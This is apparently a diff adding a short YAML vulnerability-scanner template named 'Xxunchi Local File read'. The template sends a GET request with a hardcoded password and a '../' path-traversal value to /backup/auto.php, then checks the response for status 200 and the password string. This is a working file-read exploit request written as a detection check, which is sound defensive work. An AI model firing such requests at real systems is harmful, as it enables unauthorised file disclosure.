@@ -1,0 +1,13 @@
+name:
+  - "Xxunchi Local File read"
+url:
+  - "/backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php"
+method:
+  - "GET"
+data:
+  - ""
+matchers:
+  - Status:
+      - 200
+  - Regex:
+      - "NzbwpQSdbY06Dngnoteo2wdgiekm7j4N"
